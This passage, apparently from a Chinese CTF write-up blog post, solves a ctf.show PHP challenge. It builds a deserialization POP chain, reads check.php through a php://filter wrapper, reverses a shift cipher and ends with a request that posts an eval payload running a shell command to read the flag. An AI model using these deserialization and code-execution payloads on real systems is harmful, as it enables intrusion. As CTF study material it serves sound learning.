+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>file</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;不行哦&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>aaa</span> <span class=o>=</span> <span class=k>clone</span> <span class=k>new</span> <span class=nx>EeE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>w_wuw_w</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=s2>&#34;php://filter/convert.base64-encode/resource=check.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>aaa</span> <span class=o>=</span> <span class=o>&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>思路在destruct方法中通过两次赋值获得文件内容
+可以直接来了
+EXP2</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>w_wuw_w</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=o>=</span><span class=s2>&#34;php://filter/convert.base64-encode/resource=check.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>w_wuw_w</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>aaa</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到<code>check.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>cipher</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>10000</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$charset</span> <span class=o>=</span> <span class=s2>&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$shift</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$shifted</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$char</span> <span class=o>=</span> <span class=nv>$str</span><span class=p>[</span><span class=nv>$i</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$pos</span> <span class=o>=</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$charset</span><span class=p>,</span> <span class=nv>$char</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$pos</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$new_pos</span> <span class=o>=</span> <span class=p>(</span><span class=nv>$pos</span> <span class=o>-</span> <span class=nv>$shift</span> <span class=o>+</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$charset</span><span class=p>))</span> <span class=o>%</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$charset</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$shifted</span> <span class=o>.=</span> <span class=nv>$charset</span><span class=p>[</span><span class=nv>$new_pos</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$shifted</span> <span class=o>.=</span> <span class=nv>$char</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$shifted</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>你猜我为什么没有读<code>hint.txt</code>,是我不想读嘛，🙂
+欧克，现在得到了<code>cipher</code>方法了,位移为4 的一个加密算法，我们解密试试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$new_pos = ($pos - $shift + strlen($charset)) % strlen($charset); 
+</span></span><span class=line><span class=cl>为了将密文位置向左边移动4位，那么+ strlen($charset)其实是处理负数，但是由于取余可以处理负数，所以我们可以将代码简化为
+</span></span><span class=line><span class=cl>$new_pos = ($pos - $shift ) % strlen($charset); 
+</span></span><span class=line><span class=cl>所以加密的就是把 - 变为 +
+</span></span></code></pre></td></tr></table></div></div><p>EXP：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>cipher</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>10000</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$charset</span> <span class=o>=</span> <span class=s2>&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$shift</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$original</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$char</span> <span class=o>=</span> <span class=nv>$str</span><span class=p>[</span><span class=nv>$i</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$pos</span> <span class=o>=</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$charset</span><span class=p>,</span> <span class=nv>$char</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$pos</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$new_pos</span> <span class=o>=</span> <span class=p>(</span><span class=nv>$pos</span> <span class=o>+</span> <span class=nv>$shift</span><span class=p>)</span> <span class=o>%</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$charset</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$shifted</span> <span class=o>.=</span> <span class=nv>$charset</span><span class=p>[</span><span class=nv>$new_pos</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$original</span> <span class=o>.=</span> <span class=nv>$char</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$shifted</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>cipher</span><span class=p>(</span><span class=s1>&#39;p8vfuv8g8v8py&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>得到密文<code>fe1ka1ele1efp</code>
+<strong>那么我们还是需要触发反序列化才可以RCE，前面提到需要把coos作为类来使用</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gBoBg</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$coos</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>w_wuw_w</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>w_wuw_w</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>gBoBg</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>-&gt;</span><span class=na>coos</span><span class=o>=</span><span class=nv>$a</span><span class=p>;</span>    <span class=c1>//触发__toString
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>aaa</span><span class=o>=</span><span class=nv>$b</span><span class=p>;</span> <span class=c1>//触发__invoke
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://84175f19-1c8d-4c07-9706-ebce0977f416.challenge.ctf.show/?get=fe1ka1ele1efp
+</span></span><span class=line><span class=cl>POST ：
+</span></span><span class=line><span class=cl>eval=echo `tac /f*`;
+</span></span><span class=line><span class=cl>HEADER：
+</span></span><span class=line><span class=cl>aaaaaa:O:7:&#34;w_wuw_w&#34;:1:{s:3:&#34;aaa&#34;;O:5:&#34;gBoBg&#34;:2:{s:4:&#34;file&#34;;s:0:&#34;&#34;;s:4:&#34;coos&#34;;r:1;}}
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
+<a href=/tags/ssti/>Ssti</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
